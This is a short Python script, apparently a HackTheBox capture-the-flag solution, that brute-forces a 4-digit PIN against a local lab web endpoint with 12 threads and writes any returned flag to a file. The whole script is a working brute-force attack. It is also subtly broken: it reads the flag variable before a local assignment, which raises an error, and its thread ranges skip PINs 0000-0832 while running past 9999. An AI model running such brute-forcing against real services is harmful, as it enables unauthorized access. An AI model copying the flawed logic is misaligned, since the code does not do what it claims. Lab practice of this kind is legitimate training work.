# Made by HackTheBox
# Enhanced by kyledev

import requests
import threading

ip = "127.0.0.1"  # Change this to your instance IP address
port = 5000       # Change this to your instance port number

thread_pool = 12 # Roughly 2 x CPU count
pin_len = 4 # pin len, extendable to longer pins
character_space = 10 # total character size, ie. (a-z) = 26, etc
total_variations = character_space ** pin_len # get the total possible combo size

# let's divide the attempts into equal parts within the pool
t_chunk_size = int(total_variations / thread_pool)

pin_found = False

# Try every possible 4-digit PIN (from 0000 to 9999)
def guess_pin(start_idx, end_idx):
    for pin in range(start_idx, end_idx, 1):

        # ! NOTE: this might be able to cause a race condition issue, but it shouldn't
        # break out of the loop if the pin has been found
        if pin_found:
            break

        # ! NOTE: please change this if you want it to work on anything other than a 4 digit pin
        formatted_pin = f"{pin:04d}"  # Convert the number to a 4-digit string (e.g., 7 becomes "0007")
        print(f"Attempted PIN: {formatted_pin}")

        # Send the request to the server
        response = requests.get(f"http://{ip}:{port}/pin?pin={formatted_pin}")

        # Check if the server responds with success and the flag is found
        if response.ok and 'flag' in response.json():  # .ok means status code is 200 (success)
            print(f"Correct PIN found: {formatted_pin}")
            print(f"Flag: {response.json()['flag']}")

            # send the flag to the file in case we miss the terminal output
            with open('pin_flag.txt', 'w+') as pin_flag:
                pin_flag.write(f"Correct PIN found: {formatted_pin}\nFlag: {response.json()['flag']}")
            pin_found = True
            break

t_list = []

for t_num in range(thread_pool):

    start_idx = int((t_num + 1) * t_chunk_size)
    end_idx = start_idx + t_chunk_size
    print(f"Thread: {t_num} | {start_idx} | {end_idx}")

    thread = threading.Thread(target = guess_pin, args = (start_idx, end_idx,))
    t_list.append(thread)
    thread.start()

for t in t_list:
    t.join()
